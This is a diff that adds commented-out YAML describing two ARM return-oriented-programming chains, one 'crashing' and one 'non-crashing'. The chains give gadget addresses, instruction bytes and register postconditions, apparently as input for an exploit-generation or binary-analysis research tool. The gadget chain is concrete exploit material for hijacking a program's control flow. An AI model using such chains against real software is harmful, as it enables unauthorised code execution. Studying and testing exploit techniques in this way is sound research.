@@ -33,3 +33,80 @@ states:
       '0x000120fb': ['0x25']  # '%'
       '0x000120fc': ['0x73']  # 's'
       '0x000120fd': ['0x00']  #
+# # Simple ROP Chain (crashing)
+# ropchain:
+# - instructions:
+#   - ['0x0000cf24', f0 8f bd e8, 'pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}', '']
+#   postconditions:
+#     regs:
+#       r6:   '0xbeffc136'
+#       pc:   '0x0000c9b8'
+#     mems:
+# - instructions:
+#   - ['0x0000c9b8', '06 00 a0 e1', 'mov r0, r6', '']
+#   - ['0x0000c9bc', 'b7 f2 ff eb', 'bl #0x94a0', '']
+#   postconditions:
+#     regs:
+#     mems:
+# # Advanced ROP Chain (non-crashing)
+# ropchain:
+# # Gadget 0
+# - instructions:
+#   - ["0x0000cf24", "f0 8f bd e8", "pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}", ""]
+#   postconditions:
+#     regs:
+#       r11:  0xbeffc2c9
+#       pc:   0x00009428
+#     mems:
+# # Gadget 1
+# - instructions:
+#   - ["0x00009428", "f0 af 1b e9", "ldmdb r11, {r4, r5, r6, r7, r8, r9, r10, r11, sp, pc}", ""]
+#   postconditions:
+#     regs:
+#       r5:   0xbeffc136
+#       sp:   0xbeffc4e3
+#       pc:   0x00009eb8
+#     mems:
+# # Gadget 2
+# - instructions:
+#   - ["0x00009eb8", "05 00 a0 e1", "mov r0, r5", ""]
+#   - ["0x00009ebc", "f0 87 bd e8", "pop {r4, r5, r6, r7, r8, r9, r10, pc}", ""]
+#   postconditions:
+#     regs:
+#       r3:   0x00000000
+#       pc:   0x0000997c
+#     mems:
+# # Gadget 3
+# - instructions:
+#   - ["0x0000997c", "00 00 53 e3", "cmp r3, #0", ""]
+#   - ["0x00009980", "08 80 bd 08", "popeq {r3, pc}", ""]
+#   postconditions:
+#     regs:
+#       r3:   0x000094a0
+#       pc:   0x00009984
+#     mems:
+# # Gadget 4
+# - instructions:
+#   - ["0x00009984", "33 ff 2f e1", "blx r3", ""]
+#   - ["0x00009988", "08 80 bd e8", "pop {r3, pc}", ""]
+#   postconditions:
+#     regs:
+#       r11:  0xbeffc2f1
+#       pc:   0x00009428
+#     mems:
+# # Gadget 5
+# - instructions:
+#   - ["0x00009428", "f0 af 1b e9", "ldmdb r11, {r4, r5, r6, r7, r8, r9, r10, r11, sp, pc}", ""]
+#   postconditions:
+#     regs:
+#       r4:   0x0001b850
+#       r5:   0xbeffe9c0
+#       r6:   0x64ae6532
+#       r7:   0xbeffedc0
+#       r8:   0x64ae6532
+#       r9:   0xbeffe5c0
+#       r10:  0x00021ae0
+#       r11:  0xbeffddc0
+#       sp:   0xbeffc8a0
+#       pc:   0x0000f1a4
+#     mems:
